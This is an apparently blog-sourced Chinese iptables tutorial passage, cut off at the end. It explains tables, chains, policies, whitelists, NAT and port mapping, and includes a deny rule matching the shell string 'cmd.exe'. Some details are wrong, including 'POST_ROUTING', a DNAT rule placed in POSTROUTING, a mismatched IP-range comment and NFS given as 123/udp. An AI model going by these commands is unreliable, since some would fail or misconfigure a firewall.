class=\"hljs-selector-attr\">[chain]</span> ：删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。\n-E, --rename-chain old-chain new-chain ：用指定的新名字去重命名指定的链。这并不会对链内部造成任何影响。\n-Z, --zero <span class=\"hljs-selector-attr\">[chain]</span> ：把指定链，或者表中的所有链上的所有计数器清零。\n\n-j, --jump target &lt;指定目标&gt; ：即满足某条件时该执行什么样的动作。target 可以是内置的目标，比如 ACCEPT，也可以是用户自定义的链。\n-h：显示帮助信息；\n</code></pre>\n<h2 id=\"基本参数\">基本参数</h2>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-P</td>\n<td>设置默认策略:iptables -P INPUT (DROP</td>\n</tr>\n<tr>\n<td>-F</td>\n<td>清空规则链</td>\n</tr>\n<tr>\n<td>-L</td>\n<td>查看规则链</td>\n</tr>\n<tr>\n<td>-A</td>\n<td>在规则链的末尾加入新规则</td>\n</tr>\n<tr>\n<td>-I</td>\n<td>num  在规则链的头部加入新规则</td>\n</tr>\n<tr>\n<td>-D</td>\n<td>num  删除某一条规则</td>\n</tr>\n<tr>\n<td>-s</td>\n<td>匹配来源地址IP/MASK，加叹号\"!\"表示除这个IP外。</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>匹配目标地址</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>网卡名称 匹配从这块网卡流入的数据</td>\n</tr>\n<tr>\n<td>-o</td>\n<td>网卡名称 匹配从这块网卡流出的数据</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>匹配协议,如tcp,udp,icmp</td>\n</tr>\n<tr>\n<td>--dport num</td>\n<td>匹配目标端口号</td>\n</tr>\n<tr>\n<td>--sport num</td>\n<td>匹配来源端口号</td>\n</tr>\n</tbody></table>\n<h4 id=\"命令选项输入顺序\">命令选项输入顺序</h4>\n<pre><code class=\"language-shell\">iptables -t 表名 &lt;-A<span class=\"hljs-regexp\">/I/</span>D<span class=\"hljs-regexp\">/R&gt; 规则链名 [规则号] &lt;-i/</span>o 网卡名&gt; -p 协议名 &lt;-s 源IP<span class=\"hljs-regexp\">/源子网&gt; --sport 源端口 &lt;-d 目标IP/</span>目标子网&gt; --dport 目标端口 -j 动作\n</code></pre>\n<h4 id=\"工作机制\">工作机制</h4>\n<p>规则链名包括(也被称为五个钩子函数（hook functions）)：</p>\n<ul>\n<li><strong>INPUT链</strong> ：处理输入数据包。</li>\n<li><strong>OUTPUT链</strong> ：处理输出数据包。</li>\n<li><strong>FORWARD链</strong> ：处理转发数据包。</li>\n<li><strong>PREROUTING链</strong> ：用于目标地址转换（DNAT）。</li>\n<li><strong>POSTOUTING链</strong> ：用于源地址转换（SNAT）。</li>\n</ul>\n<h4 id=\"防火墙的策略\">防火墙的策略</h4>\n<p>防火墙策略一般分为两种，一种叫<code>通</code>策略，一种叫<code>堵</code>策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进。所以我们要定义，让进来的进来，让出去的出去，<code>所以通，是要全通，而堵，则是要选择</code>。当我们定义的策略的时候，要分别定义多条功能，其中：定义数据包中允许或者不允许的策略，filter过滤的功能，而定义地址转换的功能的则是nat选项。为了让这些功能交替工作，我们制定出了“表”这个定义，来定义、区分各种不同的工作功能和处理方式。</p>\n<p>我们现在用的比较多个功能有3个：</p>\n<ol>\n<li>filter 定义允许或者不允许的，只能做在3个链上：INPUT ，FORWARD ，OUTPUT</li>\n<li>nat 定义地址转换的，也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING</li>\n<li>mangle功能:修改报文原数据，是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</li>\n</ol>\n<p>我们修改报文原数据就是来修改TTL的。能够实现将数据包的元数据拆开，在里面做标记/修改内容的。而防火墙标记，其实就是靠mangle来实现的。</p>\n<p>小扩展:</p>\n<ul>\n<li>对于filter来讲一般只能做在3个链上：INPUT ，FORWARD ，OUTPUT</li>\n<li>对于nat来讲一般也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING</li>\n<li>而mangle则是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</li>\n</ul>\n<p>iptables/netfilter（这款软件）是工作在用户空间的，它可以让规则进行生效的，本身不是一种服务，而且规则是立即生效的。而我们iptables现在被做成了一个服务，可以进行启动，停止的。启动，则将规则直接生效，停止，则将规则撤销。</p>\n<p>iptables还支持自己定义链。但是自己定义的链，必须是跟某种特定的链关联起来的。在一个关卡设定，指定当有数据的时候专门去找某个特定的链来处理，当那个链处理完之后，再返回。接着在特定的链中继续检查。</p>\n<p>注意：规则的次序非常关键，<code>谁的规则越严格，应该放的越靠前</code>，而检查规则的时候，是按照从上往下的方式进行检查的。</p>\n<p>表名包括：</p>\n<ul>\n<li><strong>raw</strong> ：高级功能，如：网址过滤。</li>\n<li><strong>mangle</strong> ：数据包修改（QOS），用于实现服务质量。</li>\n<li><strong>nat</strong> ：地址转换，用于网关路由器。</li>\n<li><strong>filter</strong> ：包过滤，用于防火墙规则。</li>\n</ul>\n<p>动作包括：</p>\n<ul>\n<li><strong>ACCEPT</strong> ：接收数据包。</li>\n<li><strong>DROP</strong> ：丢弃数据包。</li>\n<li><strong>REDIRECT</strong> ：重定向、映射、透明代理。</li>\n<li><strong>SNAT</strong> ：源地址转换。</li>\n<li><strong>DNAT</strong> ：目标地址转换。</li>\n<li><strong>MASQUERADE</strong> ：IP伪装（NAT），用于ADSL。</li>\n<li><strong>LOG</strong> ：日志记录。</li>\n<li><strong>SEMARK</strong> : 添加SEMARK标记以供网域内强制访问控制（MAC）</li>\n</ul>\n<pre><code class=\"language-shell\">                             ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓\n ┌───────────────┐           ┃    Network    ┃\n │ <span class=\"hljs-keyword\">table</span>: filter │           ┗━━━━━━━┳━━━━━━━┛\n │ chain: INPUT  │◀────┐             │\n └───────┬───────┘     │             ▼\n         │             │   ┌───────────────────┐\n  ┌      ▼      ┐      │   │ <span class=\"hljs-keyword\">table</span>: nat        │\n  │local process│      │   │ chain: PREROUTING │\n  └             ┘      │   └─────────┬─────────┘\n         │             │             │\n         ▼             │             ▼              ┌─────────────────┐\n┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅    │     ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅      │<span class=\"hljs-keyword\">table</span>: nat       │\n Routing decision      └───── outing decision ─────▶│chain: PREROUTING│\n┅┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅┅          ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅      └────────┬────────┘\n         │                                                   │\n         ▼                                                   │\n ┌───────────────┐                                           │\n │ <span class=\"hljs-keyword\">table</span>: nat    │           ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅               │\n │ chain: OUTPUT │    ┌─────▶ outing decision ◀──────────────┘\n └───────┬───────┘    │      ┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅\n         │            │              │\n         ▼            │              ▼\n ┌───────────────┐    │   ┌────────────────────┐\n │ <span class=\"hljs-keyword\">table</span>: filter │    │   │ <span class=\"hljs-comment\">chain: POSTROUTING</span> │\n │ chain: OUTPUT ├────┘   └──────────┬─────────┘\n └───────────────┘                   │\n                                     ▼\n                             ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓\n                             ┃    Network    ┃\n                             ┗━━━━━━━━━━━━━━━┛\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<h4 id=\"清空当前的所有规则和计数\">清空当前的所有规则和计数</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -F  <span class=\"hljs-comment\"># 清空所有的防火墙规则</span>\niptables -X  <span class=\"hljs-comment\"># 删除用户自定义的空链</span>\niptables -Z  <span class=\"hljs-comment\"># 清空计数</span>\n</code></pre>\n<h4 id=\"配置允许ssh端口连接\">配置允许ssh端口连接</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -A INPUT -s <span class=\"hljs-number\">192.168.1.0</span>/<span class=\"hljs-number\">24</span> -p tcp --dport <span class=\"hljs-number\">22</span> -j ACCEPT\n<span class=\"hljs-comment\"># 22为你的ssh端口， -s 192.168.1.0/24表示允许这个网段的机器来连接，其它网段的ip地址是登陆不了你的机器的。 -j ACCEPT表示接受这样的请求</span>\n</code></pre>\n<h4 id=\"允许本地回环地址可以正常使用\">允许本地回环地址可以正常使用</h4>\n<pre><code class=\"language-shell\">iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">i</span> lo -j ACCEPT\n#本地圆环地址就是那个<span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>，是本机上使用的,它进与出都设置为允许\niptables -<span class=\"hljs-selector-tag\">A</span> OUTPUT -o lo -j ACCEPT\n</code></pre>\n<h4 id=\"设置默认的规则\">设置默认的规则</h4>\n<pre><code class=\"language-shell\">iptables -P INPUT <span class=\"hljs-built_in\">DROP</span> <span class=\"hljs-meta\"># 配置默认的不让进</span>\niptables -P FORWARD <span class=\"hljs-built_in\">DROP</span> <span class=\"hljs-meta\"># 默认的不允许转发</span>\niptables -P <span class=\"hljs-keyword\">OUTPUT</span> ACCEPT <span class=\"hljs-meta\"># 默认的可以出去</span>\n</code></pre>\n<h4 id=\"配置白名单\">配置白名单</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -A INPUT -p <span class=\"hljs-literal\">all</span> -s <span class=\"hljs-number\">192.168.1.0</span>/<span class=\"hljs-number\">24</span> -j ACCEPT  # 允许机房内网机器可以访问\n<span class=\"hljs-attribute\">iptables</span> -A INPUT -p <span class=\"hljs-literal\">all</span> -s <span class=\"hljs-number\">192.168.140.0</span>/<span class=\"hljs-number\">24</span> -j ACCEPT  # 允许机房内网机器可以访问\n<span class=\"hljs-attribute\">iptables</span> -A INPUT -p tcp -s <span class=\"hljs-number\">183.121.3.7</span> --dport <span class=\"hljs-number\">3380</span> -j ACCEPT # 允许<span class=\"hljs-number\">183.121.3.7</span>访问本机的<span class=\"hljs-number\">3380</span>端口\n</code></pre>\n<h4 id=\"开启相应的服务端口\">开启相应的服务端口</h4>\n<pre><code class=\"language-shell\">iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">80</span> -j ACCEPT # 开启<span class=\"hljs-number\">80</span>端口，因为web对外都是这个端口\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> icmp --icmp-type <span class=\"hljs-number\">8</span> -j ACCEPT # 允许被ping\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -m state --state ESTABLISHED,RELATED -j ACCEPT # 已经建立的连接得让它进来\n</code></pre>\n<h4 id=\"保存规则到配置文件中\">保存规则到配置文件中</h4>\n<pre><code class=\"language-shell\">cp <span class=\"hljs-regexp\">/etc/</span>sysconfig<span class=\"hljs-regexp\">/iptables /</span>etc<span class=\"hljs-regexp\">/sysconfig/i</span>ptables.bak <span class=\"hljs-comment\"># 任何改动之前先备份，请保持这一优秀的习惯</span>\niptables-save &gt; <span class=\"hljs-regexp\">/etc/</span>sysconfig/iptables\ncat <span class=\"hljs-regexp\">/etc/</span>sysconfig/iptables\n</code></pre>\n<h4 id=\"列出已设置的规则\">列出已设置的规则</h4>\n<blockquote>\n<p>iptables -L [-t 表名] [链名]</p>\n</blockquote>\n<ul>\n<li>四个表名 <code>raw</code>，<code>nat</code>，<code>filter</code>，<code>mangle</code></li>\n<li>五个规则链名 <code>INPUT</code>、<code>OUTPUT</code>、<code>FORWARD</code>、<code>PREROUTING</code>、<code>POSTROUTING</code></li>\n<li>filter表包含<code>INPUT</code>、<code>OUTPUT</code>、<code>FORWARD</code>三个规则链</li>\n</ul>\n<pre><code class=\"language-shell\">iptables -L -t nat                  <span class=\"hljs-meta\"># 列出 nat 上面的所有规则</span>\n<span class=\"hljs-meta\">#            ^ -t 参数指定，必须是 raw， nat，filter，mangle 中的一个</span>\niptables -L -t nat  --<span class=\"hljs-keyword\">line</span>-numbers  <span class=\"hljs-meta\"># 规则带编号</span>\niptables -L <span class=\"hljs-keyword\">INPUT</span>\n\niptables -L -nv  <span class=\"hljs-meta\"># 查看，这个列表看起来更详细</span>\n</code></pre>\n<h4 id=\"清除已有规则\">清除已有规则</h4>\n<pre><code class=\"language-shell\">iptables -F <span class=\"hljs-keyword\">INPUT</span>  <span class=\"hljs-meta\"># 清空指定链 INPUT 上面的所有规则</span>\niptables -X <span class=\"hljs-keyword\">INPUT</span>  <span class=\"hljs-meta\"># 删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。</span>\n                   <span class=\"hljs-meta\"># 如果没有指定链名，则会删除该表中所有非内置的链。</span>\niptables -Z <span class=\"hljs-keyword\">INPUT</span>  <span class=\"hljs-meta\"># 把指定链，或者表中的所有链上的所有计数器清零。</span>\n</code></pre>\n<h4 id=\"删除已添加的规则\">删除已添加的规则</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加一条规则</span>\n<span class=\"hljs-attribute\">iptables</span> -A INPUT -s <span class=\"hljs-number\">192.168.1.5</span> -j DROP\n</code></pre>\n<p>将所有iptables以序号标记显示，执行：</p>\n<pre><code class=\"language-shell\">iptables -L -n <span class=\"hljs-comment\">--line-numbers</span>\n</code></pre>\n<p>比如要删除INPUT里序号为8的规则，执行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -D INPUT <span class=\"hljs-number\">8</span>\n</code></pre>\n<h4 id=\"开放指定的端口\">开放指定的端口</h4>\n<pre><code class=\"language-shell\">iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -s <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> -d <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span> -j ACCEPT               #允许本地回环接口(即运行本机访问本机)\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -m state --state ESTABLISHED,RELATED -j ACCEPT    #允许已建立的或相关连的通行\niptables -<span class=\"hljs-selector-tag\">A</span> OUTPUT -j ACCEPT         #允许所有本机向外的访问\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">22</span> -j ACCEPT    #允许访问<span class=\"hljs-number\">22</span>端口\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">80</span> -j ACCEPT    #允许访问<span class=\"hljs-number\">80</span>端口\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">21</span> -j ACCEPT    #允许ftp服务的<span class=\"hljs-number\">21</span>端口\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">20</span> -j ACCEPT    #允许FTP服务的<span class=\"hljs-number\">20</span>端口\niptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -j reject       #禁止其他未允许的规则访问\niptables -<span class=\"hljs-selector-tag\">A</span> FORWARD -j REJECT     #禁止其他未允许的规则访问\n</code></pre>\n<h4 id=\"屏蔽ip\">屏蔽IP</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -A INPUT -p tcp -m tcp -s <span class=\"hljs-number\">192.168.0.8</span> -j DROP  # 屏蔽恶意主机（比如，<span class=\"hljs-number\">192.168.0.8</span>\n<span class=\"hljs-attribute\">iptables</span> -I INPUT -s <span class=\"hljs-number\">123.45.6.7</span> -j DROP       #屏蔽单个IP的命令\n<span class=\"hljs-attribute\">iptables</span> -I INPUT -s <span class=\"hljs-number\">123.0.0.0</span>/<span class=\"hljs-number\">8</span> -j DROP      #封整个段即从<span class=\"hljs-number\">123.0.0.1</span>到<span class=\"hljs-number\">123.255.255.254</span>的命令\n<span class=\"hljs-attribute\">iptables</span> -I INPUT -s <span class=\"hljs-number\">124.45.0.0</span>/<span class=\"hljs-number\">16</span> -j DROP    #封IP段即从<span class=\"hljs-number\">123.45.0.1</span>到<span class=\"hljs-number\">123.45.255.254</span>的命令\n<span class=\"hljs-attribute\">iptables</span> -I INPUT -s <span class=\"hljs-number\">123.45.6.0</span>/<span class=\"hljs-number\">24</span> -j DROP    #封IP段即从<span class=\"hljs-number\">123.45.6.1</span>到<span class=\"hljs-number\">123.45.6.254</span>的命令是\n</code></pre>\n<h4 id=\"指定数据包出去的网络接口\">指定数据包出去的网络接口</h4>\n<p>只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。</p>\n<pre><code class=\"language-shell\">iptables -<span class=\"hljs-selector-tag\">A</span> FORWARD -o eth0\n</code></pre>\n<h4 id=\"查看已添加的规则\">查看已添加的规则</h4>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -L -n -v\n<span class=\"hljs-attribute\">Chain</span> INPUT (policy DROP <span class=\"hljs-number\">48106</span> packets, <span class=\"hljs-number\">2690</span>K bytes)\n <span class=\"hljs-attribute\">pkts</span> bytes target     prot opt in     out     source               destination\n <span class=\"hljs-attribute\">5075</span>  <span class=\"hljs-number\">589</span>K ACCEPT     <span class=\"hljs-literal\">all</span>  --  lo     *       <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>            <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>\n <span class=\"hljs-attribute\">191K</span>   <span class=\"hljs-number\">90</span>M ACCEPT     tcp  --  *      *       <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>            <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>           tcp dpt:<span class=\"hljs-number\">22</span>\n<span class=\"hljs-attribute\">1499K</span>  <span class=\"hljs-number\">133</span>M ACCEPT     tcp  --  *      *       <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>            <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>           tcp dpt:<span class=\"hljs-number\">80</span>\n<span class=\"hljs-attribute\">4364K</span> <span class=\"hljs-number\">6351</span>M ACCEPT     <span class=\"hljs-literal\">all</span>  --  *      *       <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>            <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>           state RELATED,ESTABLISHED\n <span class=\"hljs-attribute\">6256</span>  <span class=\"hljs-number\">327</span>K ACCEPT     icmp --  *      *       <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>            <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>\n\n<span class=\"hljs-attribute\">Chain</span> FORWARD (policy ACCEPT <span class=\"hljs-number\">0</span> packets, <span class=\"hljs-number\">0</span> bytes)\n <span class=\"hljs-attribute\">pkts</span> bytes target     prot opt in     out     source               destination\n\n<span class=\"hljs-attribute\">Chain</span> OUTPUT (policy ACCEPT <span class=\"hljs-number\">3382</span>K packets, <span class=\"hljs-number\">1819</span>M bytes)\n <span class=\"hljs-attribute\">pkts</span> bytes target     prot opt in     out     source               destination\n <span class=\"hljs-attribute\">5075</span>  <span class=\"hljs-number\">589</span>K ACCEPT     <span class=\"hljs-literal\">all</span>  --  *      lo      <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>            <span class=\"hljs-number\">0.0.0.0</span>/<span class=\"hljs-number\">0</span>\n</code></pre>\n<h4 id=\"启动网络转发规则\">启动网络转发规则</h4>\n<p>公网<code>210.14.67.7</code>让内网<code>192.168.188.0/24</code>上网</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -t nat -A POSTROUTING -s <span class=\"hljs-number\">192.168.188.0</span>/<span class=\"hljs-number\">24</span> -j SNAT --to-source <span class=\"hljs-number\">210.14.67.127</span>\n</code></pre>\n<h4 id=\"端口映射\">端口映射</h4>\n<p>本机的 2222 端口映射到内网 虚拟机的22 端口</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">iptables</span> -t nat -A PREROUTING -d <span class=\"hljs-number\">210.14.67.127</span> -p tcp --dport <span class=\"hljs-number\">2222</span>  -j DNAT --to-dest <span class=\"hljs-number\">192.168.188.115:22</span>\n</code></pre>\n<h4 id=\"字符串匹配\">字符串匹配</h4>\n<p>比如，我们要过滤所有TCP连接中的字符串<code>test</code>，一旦出现它我们就终止这个连接，我们可以这么做：</p>\n<pre><code class=\"language-shell\">iptables -A INPUT -p tcp -m <span class=\"hljs-keyword\">string</span> --algo kmp --<span class=\"hljs-keyword\">string</span> <span class=\"hljs-string\">\"test\"</span> -j REJECT --reject-with tcp-reset\niptables -L\n\n<span class=\"hljs-comment\"># Chain INPUT (policy ACCEPT)</span>\n<span class=\"hljs-comment\"># target     prot opt source               destination</span>\n<span class=\"hljs-comment\"># REJECT     tcp  --  anywhere             anywhere            STRING match \"test\" ALGO name kmp TO 65535 reject-with tcp-reset</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\"># Chain FORWARD (policy ACCEPT)</span>\n<span class=\"hljs-comment\"># target     prot opt source               destination</span>\n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\"># Chain OUTPUT (policy ACCEPT)</span>\n<span class=\"hljs-comment\"># target     prot opt source               destination</span>\n</code></pre>\n<h4 id=\"阻止windows蠕虫的攻击\">阻止Windows蠕虫的攻击</h4>\n<pre><code class=\"language-shell\">iptables -I INPUT -j <span class=\"hljs-keyword\">DROP</span> -p tcp -s <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">0</span> -m <span class=\"hljs-keyword\">string</span> --algo kmp --<span class=\"hljs-keyword\">string</span> <span class=\"hljs-string\">\"cmd.exe\"</span>\n</code></pre>\n<h4 id=\"防止syn洪水攻击\">防止SYN洪水攻击</h4>\n<pre><code class=\"language-shell\">iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --syn -m limit --limit <span class=\"hljs-number\">5</span>/second -j ACCEPT\n</code></pre>\n<h4 id=\"添加secmark记录\">添加SECMARK记录</h4>\n<pre><code class=\"language-shell\">iptables -t mangle -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp --<span class=\"hljs-attribute\">src</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.2</span> --dport <span class=\"hljs-number\">443</span> -j SECMARK --selctx system_u:object_r:myauth_packet_t\n# 向从 <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.2</span>:<span class=\"hljs-number\">443</span> 以TCP方式发出到本机的包添加MAC安全上下文 system_u:object_r:myauth_packet_t\n</code></pre>\n<h2 id=\"更多实例\">更多实例</h2>\n<blockquote>\n<p>用iptables搭建一套强大的安全防护盾 <a href=\"http://www.imooc.com/learn/389\">http://www.imooc.com/learn/389</a></p>\n</blockquote>\n<p>iptables: linux 下应用层防火墙工具</p>\n<p>iptables 5链: 对应 Hook point\nnetfilter: linux 操作系统核心层内部的一个数据包处理模块\nHook point: 数据包在 netfilter 中的挂载点; <code>PRE_ROUTING / INPUT / OUTPUT / FORWARD / POST_ROUTING</code></p>\n<p>iptables &amp; netfilter\n<img src=\"http://7xq89b.com1.z0.glb.clouddn.com/netfilter&amp;iptables.jpg\" alt=\"\"></p>\n<p>iptables 4表5链\n<img src=\"http://7xq89b.com1.z0.glb.clouddn.com/iptables-data-stream.jpg\" alt=\"\"></p>\n<p>iptables rules\n<img src=\"http://7xq89b.com1.z0.glb.clouddn.com/iptables-rules.jpg\" alt=\"\"></p>\n<ul>\n<li>4表</li>\n</ul>\n<p><strong>filter</strong>: 访问控制 / 规则匹配\n<strong>nat</strong>: 地址转发\n mangle / raw</p>\n<ul>\n<li>规则</li>\n</ul>\n<p>数据访问控制: ACCEPT / DROP / REJECT\n数据包改写(nat -&gt; 地址转换): snat / dnat\n信息记录: log</p>\n<h2 id=\"使用场景实例\">使用场景实例</h2>\n<ul>\n<li>场景一</li>\n</ul>\n<p>开放 tcp 10-22/80 端口\n开放 icmp\n其他未被允许的端口禁止访问</p>\n<p>存在的问题: 本机无法访问本机; 本机无法访问其他主机</p>\n<ul>\n<li>场景二</li>\n</ul>\n<p>ftp: 默认被动模式(服务器产生随机端口告诉客户端, 客户端主动连接这个端口拉取数据)\nvsftpd: 使 ftp 支持主动模式(客户端产生随机端口通知服务器, 服务器主动连接这个端口发送数据)</p>\n<ul>\n<li>场景三</li>\n</ul>\n<p>允许外网访问:\nweb\nhttp -&gt; 80/tcp; https -&gt; 443/tcp\nmail\nsmtp -&gt; 25/tcp; smtps -&gt; 465/tcp\npop3 -&gt; 110/tcp; pop3s -&gt; 995/tcp\nimap -&gt; 143/tcp</p>\n<p>内部使用:\nfile\nnfs -&gt; 123/udp\nsamba -&gt; 137/138/139/445/tcp\nftp -&gt; 20/21/tcp\nremote\nssh -&gt; 22/tcp\nsql\nmysql -&gt; 3306/tcp\noracle -&gt; 1521/tcp</p>\n<ul>\n<li>场景四</li>\n</ul>\n<p>nat 转发</p>\n<ul>\n<li>场景五</li>\n</ul>\n<p>防CC攻击</p>\n<pre><code class=\"language-shell\">iptables -L -F -A -D <span class=\"hljs-comment\"># list flush append delete</span>\n<span class=\"hljs-comment\"># 场景一</span>\niptables -I INPUT -p tcp <span class=\"hljs-params\">--dport</span> 80 -j ACCEPT <span class=\"hljs-comment\"># 允许 tcp 80 端口</span>\niptables -I INPUT -p tcp <span class=\"hljs-params\">--dport</span> 10<span class=\"hljs-function\">:22</span> -j ACCEPT <span class=\"hljs-comment\"># 允许 tcp 10-22 端口</span>\niptables -I INPUT -p icmp -j ACCEPT <span class=\"hljs-comment\"># 允许 icmp</span>\niptables -A INPUT -j REJECT <span class=\"hljs-comment\"># 添加一条规则, 不允许所有</span>\n\n<span class=\"hljs-comment\"># 优化场景一</span>\niptables -I INPUT -i lo -j ACCEPT <span class=\"hljs-comment\"># 允许本机访问</span>\niptables -I INPUT -m state <span class=\"hljs-params\">--state</span> ESTABLISHED,RELATED -j ACCEPT <span class=\"hljs-comment\"># 允许访问外网</span>\niptables -I INPUT -p tcp <span class=\"hljs-params\">--dport</span> 80 -s 10.10.188.233 -j ACCEPT <span class=\"hljs-comment\"># 只允许固定ip访问80</span>\n\n<span class=\"hljs-comment\"># 场景二</span>\nvi <span class=\"hljs-string\">/etc/vsftpd/vsftpd.conf</span> <span class=\"hljs-comment\"># 使用 vsftpd 开启 ftp 主动模式</span>\nport_enable=yes\n<span class=\"hljs-keyword\">connect</span>_from_port_20=YES\niptables -I INPUT -p tcp <span class=\"hljs-params\">--dport</span> 21 -j ACCEPT\n\nvi <span class=\"hljs-string\">/etc/vsftpd/vsftpd.conf</span> <span class=\"hljs-comment\"># 建议使用 ftp 被动模式</span>\npasv_min_port=50000\npasv_max_port=60000\niptables -I INPUT -p tcp <span class=\"hljs-params\">--dport</span> 21 -j ACCEPT\niptables -I INPUT -p tcp <span class=\"hljs-params\">--dport</span> 50000<span class=\"hljs-function\">:60000</span> -j ACCEPT\n\n<span class=\"hljs-comment\"># 还可以使用 iptables 模块追踪来自动开发对应的端口</span>\n\n<span class=\"hljs-comment\"># 场景三</span>\niptables -I INPUT -i lo -j ACCEPT <span class=\"hljs-comment\"># 允许本机访问</span>\niptables -I INPUT -m state <span class=\"hljs-params\">--state</span> ESTABLISHED,RELATED -j ACCEPT <span class=\"hljs-comment\"># 允许访问外网</span>\niptables -I INPUT -s 10.10.155.0/24 -j ACCEPT <span class=\"hljs-comment\"># 允许内网访问</span>\niptables -I INPUT -p tcp -m multiport <span class=\"hljs-params\">--dports</span> 80,1723 -j ACCEPT <span class=\"hljs-comment\"># 允许端口, 80 -&gt; http, 1723 -&gt; vpn</span>\niptables -A INPUT -j REJECT <span class=\"hljs-comment\"># 添加一条规则, 不允许所有</span>\n\niptables-save <span class=\"hljs-comment\"># 保存设置到配置文件</span>\n\n<span class=\"hljs-comment\"># 场景四</span>\niptables -t nat -L <span class=\"hljs-comment\"># 查看 nat 配置</span>\n\niptables -t nat -A POST_ROUTING -s 10.10.177.0/24 -j SNAT <span class=\"hljs-params\">--to</span> 10.10.188.232 <span class=\"hljs-comment\"># SNAT</span>\nvi <span class=\"hljs-string\">/etc/sysconfig/network</span> <span class=\"hljs-comment\"># 配置网关</span>\n\niptables -t nat -A POST_ROUTING -d 10.10.188.232 -p tcp <span class=\"hljs-params\">--dport</span> 80 -j DNAT <span class=\"hljs-params\">--to</span> 10.10.177.232<span class=\"hljs-function\">:80</span> <span class=\"hljs-comment\"># DNAT</span>\n\n<span class=\"hljs-comment\">#场景五</span>\niptables -I INPUT -p tcp <span 